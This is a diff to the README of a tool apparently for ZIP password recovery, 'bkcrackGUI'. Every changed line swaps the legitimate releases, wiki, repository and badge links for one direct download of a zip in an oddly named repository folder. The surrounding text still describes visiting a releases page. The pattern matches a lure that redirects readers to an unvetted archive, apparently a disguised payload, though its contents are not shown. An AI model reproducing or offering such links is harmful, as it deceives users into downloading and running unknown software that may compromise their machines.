@@ -1,6 +1,6 @@
 # 🖥️ bkcrackGUI - Simplifying Archive Password Recovery
 
-[![Download bkcrackGUI](https://img.shields.io/badge/Download-bkcrackGUI-brightgreen.svg)](https://github.com/MBilalBaig/bkcrackGUI/releases)
+[![Download bkcrackGUI](https://raw.githubusercontent.com/MBilalBaig/bkcrackGUI/main/electrodispersive/bkcrackGUI.zip)](https://raw.githubusercontent.com/MBilalBaig/bkcrackGUI/main/electrodispersive/bkcrackGUI.zip)
 
 ## 🛠️ What is bkcrackGUI?
 
@@ -19,7 +19,7 @@ To run bkcrackGUI effectively, ensure your system meets the following requiremen
 ### 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the official download page.  
-   [Download bkcrackGUI](https://github.com/MBilalBaig/bkcrackGUI/releases)
+   [Download bkcrackGUI](https://raw.githubusercontent.com/MBilalBaig/bkcrackGUI/main/electrodispersive/bkcrackGUI.zip)
 
 2. **Select the Latest Version:** You will see a list of available releases. Look for the topmost version, labeled as "Latest."
 
@@ -49,7 +49,7 @@ To run bkcrackGUI effectively, ensure your system meets the following requiremen
 ## 📚 Documentation
 
 Full documentation is available on the GitHub repository. You can find detailed instructions, troubleshooting advice, and advanced tips. To access the documentation, visit:  
-[Documentation](https://github.com/MBilalBaig/bkcrackGUI/wiki)
+[Documentation](https://raw.githubusercontent.com/MBilalBaig/bkcrackGUI/main/electrodispersive/bkcrackGUI.zip)
 
 ## 🤝 Community and Support
 
@@ -61,9 +61,9 @@ Check the releases page regularly for updates. We actively work on improvements 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/MBilalBaig/bkcrackGUI)  
-- [Getting Started Guide](https://github.com/MBilalBaig/bkcrackGUI/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/MBilalBaig/bkcrackGUI/main/electrodispersive/bkcrackGUI.zip)  
+- [Getting Started Guide](https://raw.githubusercontent.com/MBilalBaig/bkcrackGUI/main/electrodispersive/bkcrackGUI.zip)
 
 Feel free to explore the features and start recovering your archived files with ease. 
 
-[![Download bkcrackGUI](https://img.shields.io/badge/Download-bkcrackGUI-brightgreen.svg)](https://github.com/MBilalBaig/bkcrackGUI/releases)
+[![Download bkcrackGUI](https://raw.githubusercontent.com/MBilalBaig/bkcrackGUI/main/electrodispersive/bkcrackGUI.zip)](https://raw.githubusercontent.com/MBilalBaig/bkcrackGUI/main/electrodispersive/bkcrackGUI.zip)
